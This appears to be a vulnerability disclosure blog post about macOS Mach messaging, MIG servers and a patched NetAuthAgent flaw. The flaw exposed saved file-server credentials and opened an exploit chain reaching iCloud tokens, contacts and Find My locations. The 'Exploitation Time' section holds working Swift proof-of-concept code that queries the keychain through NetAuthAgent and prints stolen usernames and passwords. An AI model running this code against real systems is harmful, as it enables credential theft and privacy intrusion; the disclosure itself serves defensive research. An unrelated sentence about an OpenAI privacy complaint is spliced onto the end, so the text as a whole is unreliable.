    <p>The history of the Mach kernel is deeply entangled with <a href="https://en.wikipedia.org/wiki/Unix_wars">the Unix wars of the 80's and 90's,</a> with multiple organizations and groups working on it and using it, often in overlapping time periods. As such, there is not really a clean well-delineated timeline from the start of Mach to now. Additionally, certain historical notes don't have easily-found primary sources, but are repeated often enough in secondary and tertiary sources to be considered trustworthy. I have done my best to fact-check this section while also linking to primary sources (or as close as I could get) where important.</p>
    <p>Mach started life as <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/mach.html"><q>an operating systems research project of the Carnegie Mellon University School of Computer Science from 1985 to 1994.</q></a> In 1989, the Open Software Foundation (now The Open Group) announced it would be using Mach in their upcoming <a href="https://en.wikipedia.org/wiki/OSF/1">OSF/1 operating system.</a> Unfortunately, I have been unable to find a direct link to this announcement, but I did find a few sentences of coverage of the announcement in <a href="https://archive.org/details/st-report-120/page/n7/mode/2up">an archive of a late-December issue of a online magazine called <cite>CPU NewsWire Online Magazine©</cite></a> (almost immediately after some coverage of late-1980's ransomware). The coverage of the announcement reads:</p>
    <blockquote>
      <pre><code>Cambridge, MA       The Open Systems Foundation, an organization funded by
-------------       several Unix vendors to develop a new Unix standard,
                    has announced that they may use the Mach OS (currently
                    used in the NeXT System) as the foundation for OSF/1,
                    their new systems software platform, instead of using
                    A/IX, IBM's version of Unix.

                    Mach provides better data security measures, inherent
                    support for multiprocessing, and compatibility with
                    Berkeley Unix.  But given that IBM's support of the
                    OSF was partly based on the OSF's use of A/IX, and
                    that much of the OSF's credibility depends on OSF/1
                    shipping by the announced date of July 1990....</code></pre>
    </blockquote>
    <p>It is unclear if the use of <q>Open Systems Foundation</q> is an error, or simply another name the OSF was known by at the time. I'm also not sure why the last sentence ends the way that it does, as despite the ellipses, it does appear to be the end of the coverage. More pertinent to the current topic, though, is the reference to <q>the NeXT System.</q> This is likely referring to <a href="https://en.wikipedia.org/wiki/NeXTSTEP">NeXTSTEP,</a> the operating system from <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> (the company that Steve Jobs founded after originally being ousted from Apple). This is the link that would ultimately bring Mach into what is now macOS.</p>
    <p>To say that NeXTSTEP simply used Mach would not tell the whole story. One of the original developers of Mach (and longtime friend of Steve Jobs) <a href="https://en.wikipedia.org/wiki/Avie_Tevanian">Avie Tevanian</a> worked with Steve as an executive at NeXT. When <a href="https://web.archive.org/web/19970301172356/http://live.apple.com/next/961220.pr.rel.next.html">NeXT was later acquired by Apple,</a><a></a> both Steve and Avie were given executive positions at their new parent company. Their NeXTSTEP operating system was developed into <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)">Darwin</a> the operating system basis for the next commercial release of Apple's Macintosh operating system: Mac OS X (now macOS).</p>
    <h2>Why Mach?</h2>
    <p>As mentioned previously, Mach was developed during the Unix wars of the 80's and 90's. Operating system vendors were all competing with each other to provide what they saw as the best way to design and use a Unix system. So what was it about Mach's Unix that was so special? What made it stand out amongst all the others? Really, it was the fact that <strong><em>it wasn't Unix</em></strong>... at least not <em>completely.</em></p>
    <p>In a paper submitted to the <cite><a href="https://archive.org/details/1986-proceedings-summer-tech-atlanta/page/93/mode/2up">USENIX 1986 Summer Technical Conference &amp; Exhibition</a></cite> (one of the earliest sources I could find), the developers laid out their vision and reasoning for creating Mach. They describe a landscape where inter-process communication had become frustratingly complex in Unix. What had started with the lowly file descriptor (a single handle that could allow a process to read, write, or seek) had turned into a confusing mess of streams, sockets, shared memory, and more. In an effort to simplify, they designed a system around Unix based on <em>four basic abstractions.</em></p>
    <h2>The Architecture of Mach</h2>
    <h3>The Four Abstractions</h3>
    <p>The four basic abstractions of Mach, as explain by the 1986 USENIX paper, are as follows (emphasis theirs):</p>
    <blockquote>
      <ol>
        <li>A <em>task</em> is an execution environment in which threads may run. It is the basic unit of resource allocation. A task includes a paged virtual address space and protected access to system resources (such as processors, port capabilities and virtual memory). The UNIX notion of a <em>process</em> is, in Mach, represented by a task with a single thread of control.</li>
        <li>A <em>thread</em> is the basic unit of CPU utilization. It is roughly equivalent to an independent program counter operating within a task. All threads within a task share access to all task resources.</li>
        <li>A <em>port</em> is a communication channel -- logically a queue for messages protected by the kernel. Ports are the reference objects of the Mach design. They are used in much the same way that object references could be used in an object oriented system. <em>Send</em> and <em>Receive</em> are the fundamental primitive operations on ports.</li>
        <li>A <em>message</em> is a typed collection of data objects used in communication between threads. Messages may be of any size and may contain pointers and typed capabilities for ports.</li>
      </ol>
    </blockquote>
    <p>Things certainly have changed in the several decades since this paper's release. For example, Mach threads actually pre-date <a href="https://en.wikipedia.org/wiki/Pthreads">POSIX threads</a> by nearly a decade (<a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html#thread-injection">this fact has lead to difficulty when attempting shellcode injection on macOS</a>). However, despite decades of other software changes, these four abstractions still underpin what Mach is today in modern macOS (and all other XNU-based Apple OS's).</p>
    <h3>Tasks, Ports, and Port Rights</h3>
    <p>Ports in Mach are interesting as the queues themselves really only exist in kernel space. Ports are exposed to user space as integers, similar to file descriptors. Except <em>not really.</em> What is actually exposed are port <em>rights,</em> with each task having a <q>port name space</q> containing <em>named</em> port rights (the integers themselves being referred to as the <q>names</q> of these rights). In some cases, two <em>different</em> rights to the <em>same</em> port may have the same <q>name</q> and are thus exposed to the owning task in user space with the same integer.</p>
    <p>Despite all this, in what appears to be an effort to use similarly-named API's in both kernel space and user space, these <q>named port rights</q> are often referred to simply as <q>ports</q> in user space, despite that being technically incorrect. It can all be very confusing, and only really starts to make sense after practice and immersing one's self in the world of Mach.</p>
    <p>Regarding rights themselves, the two main types of rights are <b>send rights</b> and <b>receive rights</b>. The kernel will allow multiple tasks to hold a send right to a port, but will only allow a single task to hold a receive right. This essentially creates a <b>client-server model</b> with a single server task receiving messages from multiple client tasks. As alluded to by the Mach paper above, a task is basically synonymous with a process. However, there is one special task in Mach, the kernel itself (more on that later).</p>
    <h3>The Structure of a Message</h3>
    <p>Conceptually, each Mach message contains, in order:</p>
    <ol>
      <li>A header,</li>
      <li>an optional body of descriptors,</li>
      <li>an arbitrary payload of bytes, and</li>
      <li>a kernel-appended trailer (only on received messages).</li>
    </ol>
    <p>Descriptors allow tasks to share out-of-line memory and even port rights with each other, with the kernel mapping addresses and manipulating port name spaces as necessary. The data in the arbitrary payload, on the other hand, is transferred as-is from the sending task to the receiving task.</p>
    <h3>How Tasks Get Send Rights</h3>
    <p>One might wonder how a task gets send rights to start with. macOS includes a <b>bootstrap server,</b> a Mach task that holds the receive right to a port to which every task holds a send right. The bootstrap server exposes the concept of <b>Mach services,</b> which are Mach servers registered with the bootstrap port with specific string names. Clients can ask the bootstrap server for send rights to these Mach services by name.</p>
    <h2>The Mach Interface Generator (MIG)</h2>
    <h3>Introduction</h3>
    <p>While Mach messages seem simple on their face, in practice they can involve a lot of manual memory management, which can be prone to issues. Perhaps in an effort to combat this, the authors of Mach included <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/doc/abstracts/mig.html"><abbr title="Mach Interface Generator">MIG</abbr>,</a> which provides a way to create functional interfaces around the sending and receiving of Mach messages.</p>
    <p>MIG is two parts: a pseudo-C IDL (interface definition language) and a compiler that takes in an IDL file and outputs multiple C files:</p>
    <ul>
      <li>a C source file to run on clients,</li>
      <li>a C source file to run on the server, and</li>
      <li>a C header file to use for both.</li>
    </ul>
    <p>These files define functions that handle the messages for the clients and server, exposing an <abbr title="remote procedure call">RPC</abbr>-style interface wherein a client needs only to call a function on its end and a server needs only to implement that function on its end. This makes for a much more memory-safe messaging experience.</p>
    <h3>The Technical Details</h3>
    <p>On a technical level, MIG is really just a wrapper around Mach messages. Each function is referred to as a <b>routine,</b> with a collection of routines being referred to as a <b>subsystem.</b> Each subsystem has a <q>subsystem number</q> of off which the routines will be indexed. These indexes are included in the <q>message ID</q> field of the message header. For example, in a subsystem with the number 18000, messages meant for the second routine will have a message ID of 18001 (the routines are zero-indexed).</p>
    <p>MIG is actually used heavily by the kernel. Mach itself doesn't have many system calls (specifically where a special CPU instruction is called and the kernel does something different based on a number in some register). The call to send or receive a message is, itself, a system call. However, many kernel API's you might think are system calls are merely MIG functions that send Mach messages to the kernel, which will perform the requested operation and return the result in a reply message.</p>
    <p>For communication across user space, MIG has been largely superseded by <a href="https://developer.apple.com/documentation/xpc">Apple's own XPC API's.</a> XPC (and really most IPC mechanisms on macOS) are also built on top of Mach messages, as they are the fundamental unit of inter-process communication in the Mach kernel. However, the XPC API's are much more developer-friendly than MIG. It's actually unclear if Apple ever truly supported third-party developers using MIG, as there does not appear to be any documentation from them on how to use it. However, they still do maintain <a href="https://github.com/apple-oss-distributions/bootstrap_cmds">their own version,</a> and there are a few legacy MIG servers still around.</p>
    <p>For those who are curious about the different IPC mechanisms in macOS, I highly recommend <a href="https://www.youtube.com/watch?v=D1jNCy7-g9k">Ian Beer's fantastic talk on the topic.</a> The video itself is nearly a decade old at this point, and many of the specific attack vectors he talks about (specifically those around memory manipulation) may not be entirely applicable today. However, it is still a very comprehensive look into the many different API's that processes have at their disposal on macOS to communicate with each other. Anyway, back to MIG!</p>
    <h2>Exploiting MIG Servers</h2>
    <h3>On the Security of MIG Servers</h3>
    <p>You might notice the lack of security measures native to MIG. What is to stop a task from getting a send right to a MIG server and sending it the same messages that the MIG-compiled client code would, ultimately calling the remote routines on the server? There are ways a MIG server can verify the sender of a message. But if it neglects to do so, <strong><em>any task with a send right can call routines on the MIG server.</em></strong></p>
    <h3>Finding MIG Servers</h3>
    <p>But how would you find MIG servers to exploit? This is where <a href="https://github.com/blacktop/ipsw">the <code>ipsw</code> <abbr title="command-line interface">CLI</abbr> tool from blacktop</a> comes in very handy. The code that MIG compiles, almost as a rule, uses the specific symbol <a><code>NDR_record</code></a> as the first field of every payload. It appears this symbol is meant to convey information on how certain primitives (such as characters and integers) are represented on the sending task.</p>
    <p>The interesting thing about this is that I've <em>never</em> come across a MIG server that actually uses that field of the payload when parsing received messages. In spite of this, <code>NDR_record</code> is still used in essentially all messages. Since it is an external symbol, this makes it easy to find binaries that use it. The <code>ipsw</code> CLI includes a subcommand that, when pointed to a <code>.ipsw</code> file (an update package for Apple OS's), you can search for binaries that import a specific symbol. To find binaries that use the <code>NDR_record</code> symbol, you can run:</p>
    <pre><code>ipsw macho search /path/to/update.ipsw -m "NDR_record"</code></pre>
    <p>An important thing to note is that this will find both MIG servers and <em>MIG clients</em> (some binaries are even both a MIG client and a MIG server). However, it is fairly easy to tell the difference between client and server code once a binary is opened in a disassembler or decompiler. I may publish a more specific follow-up article detailing how to reverse MIG servers.</p>
    <h2 id="exploitation-time">Exploitation Time!</h2>
    <h3>Introducing NetAuthAgent</h3>
    <p><b>NetAuthAgent</b> is a daemon on macOS (more specifically a <q>user agent,</q> as <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">the OS documentation delineates between the two terms</a>) that is responsible for handling the credentials for file servers (FTP, Samba, WebDAV, etc.). Before this vulnerability was patched, you could send a message to NetAuthAgent asking for the credentials to any server, and it would just <strong><em>give them to you.</em></strong></p>
    <h3>How NetAuthAgent Works</h3>
    <p>When <a href="https://support.apple.com/guide/mac-help/connect-mac-shared-computers-servers-mchlp1140/mac">accessing a file sever through Go -&gt; Connect To Server in Finder</a> a dialog box like the one below might appear. This dialog is actually coming from NetAuthAgent (or perhaps a sibling process of NetAuthAgent). If the user opts to check the box to remember the password, the credentials are stored in the macOS <b>keychain.</b></p>
    <img alt="A password prompt with the phrase 'No one can see this, right?' in the name field. There is a checkbox to save the password to the macOS keychain." src="https://wts.dev/posts/password-leak/password-dialog.png" height="700">
    <h4>The macOS Keychain</h4>
    <p>It's important to understand that NetAuthAgent itself did not (and does not) store the credentials directly. The macOS keychain is essentially a central secrets manager. NetAuthAgent uses this centralized location to store the credentials. Apple seems to downplay the importance of the keychain, with <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac">the documentation for their GUI Keychain Access app</a> describing it as merely a way to <q>manage certificates.</q> The OS will also attempt to direct users to the Passwords app when users open the Keychain Access app:</p>
    <img alt="A dialog box titled 'Manage Your Passwords in the New Passwords App' that reads 'Use the Passwords app to manage your passwords and passkeys, set up verification codes, and view security recommendations to keep your accounts safe.' The primary action button reads 'Open Passwords' and the secondary action button reads 'Open Keychain Access'. A check box allows the user to tell the OS 'Do not show this message again.'" src="https://wts.dev/posts/password-leak/passwords-popup.png" height="800">
    <p>In reality, the keychain is much more than Apple would suggest. Many applications, including NetAuthAgent, use it to store secrets. It's a fairly well-designed system, with each keychain item having its own access control list. This generally blocks applications from accessing secrets they should not have access to. However, if a process were to expose a mechanism for other processes to essentially proxy keychain queries through it, that can undermine the security of the whole system.</p>
    <h4>NetAuthAgent's MIG Server</h4>
    <p>NetAuthAgent exposes a MIG server available to lookup from the bootstrap server under the name <code>com.apple.netauth.user.gui</code>. The server exposed routines to read, create, and even overwrite in some cases, file server credentials. None of the routines ever verified message senders before this patch.</p>
    <h3>Exploiting NetAuthAgent</h3>
    <h4>On Kass</h4>
    <p>While exploring the internals of XNU, I decided to develop <a href="https://github.com/nmggithub/Kass">Kass,</a> a security research tool written in Swift, to help me have a better time dealing with Mach messages. Kass has since expanded to cover much more than Mach messages, covering many more Mach API's in XNU as well as several of its BSD-layer kernel API's.</p>
    <p>The proof-of-concept code I am including here will be written with the help of this tooling. Most of the code will be presented with minimal comment, as if I had to explain all the intricacies of how Kass works, in addition to Swift syntax, this article would be much longer than it already is! If you're curious about how to use Kass, I encourage you to take a look through <a href="https://swiftpackageindex.com/nmggithub/Kass/v4.2.1/documentation/machcore">my documentation.</a></p>
    <h4>Building a MIG Client</h4>
    <p>
      Kass provides an easy way to define a MIG client with a service name and subsystem number (the <code>baseRoutineID</code> argument) like so:
    </p>
    <pre><code>class NetAuthAgentClient: Mach.MIGClient, Mach.PortInitializableByServiceName {
    convenience init() throws {
        try self.init(serviceName: "com.apple.netauth.user.gui", baseRoutineID: 40200)
    }

  ...
}</code></pre>
    <h4>Writing a Client Routine Handler</h4>
    <p>Keychain items on macOS have a metadata field that says what <q>class</q> an item is of. Routine 19 (message ID 40219) of NetAuthAgent allows clients to essentially proxy keychain queries for items with a class of <q><a href="https://developer.apple.com/documentation/security/ksecclassinternetpassword">internet password.</a></q> This is the class that NetAuthAgent uses for most file server credentials. The routine takes in an out-of-line data descriptor containing a serialized dictionary of arguments, and returns two out-of-line data descriptors containing the username and password.</p>
    <p>
      Note that the routine expects the size of the data in the descriptor to be sent along in the payload (even though the descriptor itself includes the size). This is because that is what the MIG-compiled client code does for this routine, so this code needs to emulate that behavior.
    </p>
    <pre><code>...

    func getInternetPassword(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil,
        username: String? = nil
    ) throws -&gt; (username: String, password: String) {
        struct InternetPasswordPayload: Mach.TrivialMessagePayload, Mach.MIGPayloadWithNDR {
            let NDR: NDR_record_t = NDR_record_t()
            let size: mach_msg_size_t
        }
        let plistData = self.serializeInternetPasswordOptions(
            scheme: scheme, host: host, port: port, path: path
        )
        let reply = try self.doRoutine(
            19,
            request: Mach.MIGRequest(
                descriptors: [
                    mach_msg_ool_descriptor_t(data: plistData)
                ],
                payload: InternetPasswordPayload(size: mach_msg_size_t(plistData.count))
            )
        )
        let username = String(
            data: (reply.body!.descriptors[0] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        let password = String(
            data: (reply.body!.descriptors[1] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        return (username, password)
    }

    ...</code></pre>
    <p>The code above calls <code>serializeInternetPasswordOptions</code> to serialize a dictionary so it can be sent in an out-of-line data descriptor. Below is the implementation for that helper function:</p>
    <pre><code>...

    private func serializeInternetPasswordOptions(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil
    ) -&gt; Data {
        var options: [String: Any] = [:]
        if let scheme = scheme { options["Scheme"] = scheme }
        options["Host"] = host
        if let port = port { options["AlternatePort"] = port }
        if let path = path { options["Path"] = path }
        return try! PropertyListSerialization.data(
            fromPropertyList: options, format: .binary, options: 0
        )
    }

    ...</code></pre>
    <h4>Finding Credentials To Query</h4>
    <p>The macOS keychain provides <a href="https://developer.apple.com/documentation/security/secitemcopymatching(_:_:)">API's to query for keychain items,</a> and these are what NetAuthAgent uses internally. Interestingly, these API's can often be used by unprivileged processes to get the <em>metadata</em> about keychain items, as long as they are not asking for the secret values themselves. The below defines a variable <code>netAuthAgentInternetPasswords</code> that will contain an array of keychain items that NetAuthAgent should be able to access.</p>
    <pre><code>var netAuthAgentInternetPasswords: [[CFString: Any]] {
    var cfItems: CFTypeRef?
    let copyMatchingStatus = SecItemCopyMatching(
        [
            kSecClass: kSecClassInternetPassword,
            kSecReturnAttributes: true,
            kSecMatchLimit: kSecMatchLimitAll,
            kSecReturnRef: true,
        ] as CFDictionary,
        &amp;cfItems
    )
    guard let items = cfItems as? [[CFString: Any]], copyMatchingStatus == errSecSuccess
    else { return [] }
    return items.compactMap {
        item in
        guard let keychainItem = item[kSecValueRef as CFString] as! SecKeychainItem?
        else { return nil }
        guard canNetAuthAgentAccess(keychainItem: keychainItem) else { return nil }
        return item
    }
}</code></pre>
    <p>The access control list is among the metadata that is accessible without privilege, allowing for this code to check if NetAuthAgent is in the list of trusted applications.</p>
    <pre><code>func canNetAuthAgentAccess(keychainItem: SecKeychainItem) -&gt; Bool {
    var access: SecAccess?
    let copyAccessStatus = SecKeychainItemCopyAccess(keychainItem, &amp;access)
    guard let access = access, copyAccessStatus == errSecSuccess else { return false }
    var aclList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
    let copyACLStatus = SecAccessCopyACLList(access, &amp;aclList)
    guard let aclList = aclList, copyACLStatus == errSecSuccess else { return false }
    let acls = aclList as! [SecACL]
    for acl in acls {
        var applicationList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
        var description: CFString?
        var promptSelector: SecKeychainPromptSelector = .init()
        let copyContentsStatus = SecACLCopyContents(
            acl, &amp;applicationList, &amp;description, &amp;promptSelector
        )
        guard let applicationList = applicationList, copyContentsStatus == errSecSuccess else {
            continue
        }
        let applications = applicationList as! [SecTrustedApplication]
        for application in applications {
            var data: CFData? = CFDataCreateMutable(nil, 0)
            let copyRequirementStatus = SecTrustedApplicationCopyData(application, &amp;data)
            guard let data = data as? Data, copyRequirementStatus == errSecSuccess else {
                continue
            }
            let app = String(data: data, encoding: .utf8)
            if app?.contains("/System/Library/CoreServices/NetAuthAgent.app") == true {
                return true
            }
        }
    }
    return false
}</code></pre>
    <p>
      These credentials can then be iterated over in a simple loop like so:
    </p>
    <pre><code>for item in netAuthAgentInternetPasswords {
    let protocolType = item[kSecAttrProtocol as CFString] as! CFString
    let host = item[kSecAttrServer as CFString] as! String
    let port = item[kSecAttrPort as CFString] as? Int
    let path = item[kSecAttrPath as CFString] as? String
    let username = item[kSecAttrAccount as CFString] as? String
    let displayName = item[kSecAttrLabel as CFString] as! String
    print("Item:")
    print("\tDisplay Name: \(displayName)")
    print("\tProtocol: \(protocolType)")
    print("\tHost: \(host)")
    if let port = port { print("\tPort: \(port)") }
    if let path = path { print("\tPath: \(path)") }
    if let username = username { print("\tUsername: \(username)") }
    let credentials = try NetAuthAgentClient().getInternetPassword(
        host: host, port: port, path: path, username: username
    )
    print("Credentials:")
    print("\tUsername: \(credentials.username)")
    print("\tPassword: \(credentials.password)")
}</code></pre>
    <h3>This is bad.</h3>
    <p>This is obviously a pretty bad situation. Before this vulnerability was patched, a malicious process with the ability to get a send right to NetAuthAgent could then leak all the file server credentials. This is especially dangerous as, in corporate environments, these could be <a href="https://en.wikipedia.org/wiki/Single_sign-on"><abbr title="Single sign-on">SSO</abbr> credentials,</a> potentially giving an attacker access to multiple other resources within the corporate system.</p>
    <p>While it is basically impossible to know how many companies are using the <q>Connect to Server</q> feature in Finder to connect ot their file servers (instead of using alternate third-party) clients, it is possible to see <em>other</em> organizations that are likely using it. When doing research for this vulnerability, I found multiple colleges and universities with help articles directing students and faculty to use this feature, with many explicitly telling users to check the box saving the credentials to the keychain.</p>
    <p>One article of note was a print server vendor's instructions on connecting to printers (yes NetAuthAgent handles printer server credentials too). I did also find at least one article instructing users <em>not</em> to check the box, as Apple's Keychain Access app would be too unwieldy for a general user to use if they needed to update the saved password.</p>
    <p>Additionally, while I was unable to confirm it, this could also potentially lead to a privilege escalation attack if those credentials could also be used as superuser credentials on a managed device. It's fairly trivial to <a href="https://gist.github.com/nmggithub/779563215439beb36692957900d9ec1e">silently escalate to root on macOS, if the credentials for an administrative user are known.</a> I did not have a managed device to test with, so I cannot confirm this. However, I recall when I did use a MacBook provided by my employer, I signed into it using my SSO credentials.</p>
    <p>It's also important to understand how this affects individual users as well. If a user has their own <abbr title="network-attached storage">NAS</abbr> and connected to it via Finder (and opted to save the credentials), this vulnerability would expose those credentials to attackers. If that user also reused those credentials for other internet accounts, an attacker could compromise those other accounts as well.</p>
    <p>And of course, barring any additional security checks, this vulnerability allows an attacker to access the files on the server. These files could be literally anything: from a users personal documents to a company's highly sensitive trade secrets. Given that FTP, Samba, and WebDAV all have well-defined interfaces, discovery and exfiltration of files can easily be automated after the credentials are leaked.</p>
    <p>Another, less likely, use of this vulnerability is as a covert data-hiding method for other malicious processes. As NetAuthAgent exposed routines to <em>create</em> keychain items, a particularly crafty malicious process could delegate it to create specific items, stuffing arbitrary data into the <q>password</q> field. When that process needs the data again, it can ask NetAuthAgent to supply it. This avoids writing to disk, which might trigger security software. I'm unaware of any security software that explicitly checks the keychain for suspicious entries. And who would manually check their keychain for such things?</p>
    <p>As a final note, this vulnerability did open up the possibility of a malicious process saving legitimate credentials to the keychain. While this probably wouldn't do anything on it's own, it could be used in a more complex attack where an attacker saves credentials to a file server they control and then social engineers the user into entering the address into the <q>Connect to Server</q> dialog, or similar. How that could progress to a compromise, I am unsure. But it is a possibility.</p>
    <h2>An Exploit Chain</h2>
    <h3>Introduction</h3>
    <p>One might think that if they don't use the <q>Connect to Server</q> option in Finder, that they have nothing to worry about in regards to this vulnerability. <strong><em>They would be wrong.</em></strong> This vulnerability also exposed an exploit chain that allowed attackers access to much more than what has been mentioned above.</p>
    <h3>The Keychain Item</h3>
    <p>Remember how each keychain item has its own access control list? And remember how all NetAuthAgent is doing is proxying keychain requests? It would be <em>really</em> bad if there was a keychain item, that didn't have anything to do with file servers, that had an open enough <abbr title="access control list">ACL</abbr> to where NetAuthAgent could access it.</p>
    <p>It turns out: there is such an item. On basically every macOS device, there is a keychain item that contains…</p>
    <ul>
      <li>…a decryption key…</li>
      <li>…for a file on-disk that contains…</li>
      <li><strong><em>…iCloud account information and API tokens.</em></strong></li>
    </ul>
    <h3>What's in The File?</h3>
    <p>Taking the keychain item and the file (which is at a known location on-disk), an attacker can decrypt the file and gain access to a wealth of information on the iCloud account of the device's user:</p>
    <ul>
      <li>first and last name,</li>
      <li>email address,</li>
      <li>email aliases,</li>
      <li>enabled features and their endpoints,</li>
      <li>multiple long-lasting API tokens, etc.</li>
    </ul>
    <p>This is personal information that I would assume the average user would not want to be exposed in this way. The more dangerous part, though, is the exposure of the API keys. What could an attacker use this for?</p>
    <h3>Using the API Tokens</h3>
    <h4>Previous Work</h4>
    <p>At this point, I am indebted to <a href="https://wojciechregula.blog/post/bypass-tcc-via-icloud/">the work of <span lang="pl">Wojciech Reguła</span>,</a> a Polish security researcher and <a href="https://www.securing.pl/en/author/wojciechregula/">head of mobile security at Securing.</a> He was able to find these API tokens, albeit through a different method, several years ago. He used the tokens to leak out the user's:</p>
    <ul>
      <li>Contacts,</li>
      <li>Calendars,</li>
      <li>Reminders, and</li>
      <li>even <strong><em>their location through Find My.</em></strong></li>
    </ul>
    <p>I was able to replicate <em>all of this</em>, save for Reminders on newer and migrated accounts as Apple has recently migrated them to the more-secure CloudKit (where they are only accessible in their encrypted form). It's likely that Contacts and Calendars were not given this treatment in an effort to allow for easier integration with third-party software. Tangentially, the Find My network likely doesn't have much additional security around it to better enable smooth operation of the network itself.</p>
    <h4>My Additions</h4>
    <p>I was able to take Wojciech's work and expand upon it, adding the ability to:</p>
    <ul>
      <li>leak contact photos,</li>
      <li>query (but not decrypt) CloudKit,</li>
      <li>leak data from the <a href="https://developer.apple.com/documentation/foundation/nsubiquitouskeyvaluestore">iCloud key-value store,</a></li>
      <li>leak metadata about iCloud backups (including device serial numbers),</li>
      <li><strong><em>leak the locations of the user's other devices through Find My,</em></strong></li>
      <li><strong><em>leak the locations of the user's friends through Find My,</em></strong></li>
      <li>and even perform lock, erase, and <q>play sound</q> operations through Find My.</li>
    </ul>
    <p>I did try to investigate what would be needed to decrypt CloudKit data, and I did get pretty close (at least, I believe I was close), but I was unable to finish and ultimately gave up. However, I would not be surprised if it is within the capabilities of some commercial forensics companies out there to use these API tokens (along with the PIN for an iOS device, if necessary) to decrypt CloudKit data, either directly from CloudKit or (more likely) from the user's iCloud backups.</p>
    <h3>This is <em>really</em> bad.</h3>
    <p>This is now obviously a very bad situation. Not only did this vulnerability expose file server credentials (and all the mess that causes), but it also exposed iCloud API tokens, opening up even more avenues of attack (potentially more than I have even speculated on in this article). And all of this stemmed from one daemon not verifying the senders of messages it received. But wait a minute. How <em>should</em> a daemon do that?</p>
    <h2>What Should Apple Have Done?</h2>
    <p>I am now going to say the one word that a bunch of readers have probably been screaming in their heads for the past while: <b><a href="https://developer.apple.com/documentation/bundleresources/entitlements">entitlements.</a></b> Entitlements, on their own, are simply key-value pairs attached to a binary at code-signing time. At the lowest level (i.e. <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html#//apple_ref/doc/uid/TP40005929-CH4-SW13">when using the <code>codesign</code> CLI directly</a>), a binary can be signed with any arbitrary entitlements.</p>
    <p>However, in every macOS device in the standard security configuration, there is a kernel module called Apple Mobile File Integrity that will scan every process that launches and will immediately kill processes that have <q>restricted entitlements</q> that they don't have a proper <b>provisioning profile</b> for. Provisioning profiles have to be signed by Apple, so it's very difficult to get past this check.</p>
    <p>This results in a system where the processes that are running should only have entitlements that were allowed by <abbr title="Apple Mobile File Integrity">AMFI</abbr>. Thus, if you were to check the entitlements of a process, they would serve as a good metric of what the process is entitled (hence the name) to do. This is ultimately what NetAuthAgent should have done, and what it does now. When it receives a message, it first checks the entitlements of the sender. If the sender does not have the entitlements key <code>com.apple.private.netauth.useragent.allow</code> with a boolean value of <code>true</code>, it refuses to respond to the message. This effectively blocks any exploitation of NetAuthAgent's MIG routines.</p>
    <p>But how can a daemon know the sender of a Mach message? Well, remember that a message, when received, has a kernel-appended trailer. This trailer contains, among other things, an <b>audit token</b> that can be used to uniquely identify the sending task. A receiving task can use the audit token and ask the kernel for the entitlements dictionary for the task with that token. It can then parse through that dictionary and act upon the existence (or non-existence) of given entitlements keys and value. Again, this is what NetAuthAgent now does and (honestly) what it should have been doing all along.</p>
    <h2>Conclusion</h2>
    <h3>The Weakest Link</h3>
    <p>Its vulnerabilities like this that call to mind the old phrase <q>a chain is no stronger than its weakest link.</q> The credentials for file servers may have been stored in a way where only a specific application could access them, but if that application also allowed other applications to command it to retrieve those credentials, that's the weakest link. If API tokens to iCloud are stored in an encrypted file on disk, but the decryption key has a wide access control list, that's the weakest link.</p>
    <h3>How Secure is Apple?</h3>
    <p>In my time researching the macOS platform, I have found that Apple generally has good security infrastructure. I've focused primarily on inter-process communication mainly due to the fact that process injection is extremely difficult to achieve with all of Apple's security measures in place. Despite the, honestly laughable, simplicity of this vulnerability (and even the large danger it poses), I don't mean to imply that Apple is bad at security. I would say they are often far better than competitors.</p>
    <p>But that doesn't mean you should trust them implicitly. In early February of 2025, <a href="https://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"><cite>The Washington Post</cite> reported that the United Kingdom had ordered that Apple give them access to customer data</a> under the <cite>Investigatory Powers Act of 2016</cite>. Later that month, <a href="https://support.apple.com/en-us/122234">Apple pulled Advanced Data Protection, a more advanced encryption feature, for their <abbr title="United Kingdom">UK</abbr> customers.</a> While some praised Apple for not providing the UK government with <q>a backdoor,</q> I find the act of pulling the feature to still be capitulation. The UK government got what they wanted, which was easier access to the data. And while <a href="https://www.theguardian.com/technology/2025/mar/14/apple-uk-encryption-legal-challenge-heard-behind-closed-doors">Apple is reportedly fighting back against the order,</a> this situation makes it clear that, in the face of overbearing governments, Apple cannot be trusted.</p>
    <h3>My Recommendations</h3>
    <p>For those who still can, I would encourage you to <a href="https://support.apple.com/en-us/108756">enable Advanced Data Protection.</a> Alternatively, if you never use a web browser to access your iCloud, you can at least <a href="https://support.apple.com/en-us/102630">disable web access to iCloud data.</a> The iCloud website sometimes uses different API endpoints than Apple's iCloud apps. I actually did not research these specific endpoints much for this vulnerability, so it's possible they were/are more vulnerable to attacks with the API tokens. While the tokens are no longer accessible through this vulnerability, they <em>were</em> exposed through a previous vulnerability and may be exposed by some later one.</p>
    <p>Finally, while there is no evidence this exploit was ever used (or even found) by malicious actors, if you are particularly concerned that your credentials were exploited through this vulnerability, you should obviously change them. And for anyone who still hasn't updated their macOS devices since October of last year: please update now. I hope this article has accurately informed you on the importance of updating.</p>
    <h3>A Final Question</h3>
    <p>One final question you might have is this: <q>Given that MIG is a legacy communication protocol, largely superseded by XPC, what are the chances there are other vulnerable MIG servers out there?</q></p>
    <p>Until next time... <a target="_self" href="https://wts.dev/feed.xml">watch this space.</a></p>

<div id="readability-page-1" class="page"><div>
<p id="speakable-summary">OpenAI is facing another privacy complaint in Europe over its viral AI chatbot’s tendency to hallucinate false information — and this one might prove tricky for regulators to ignore.</p>

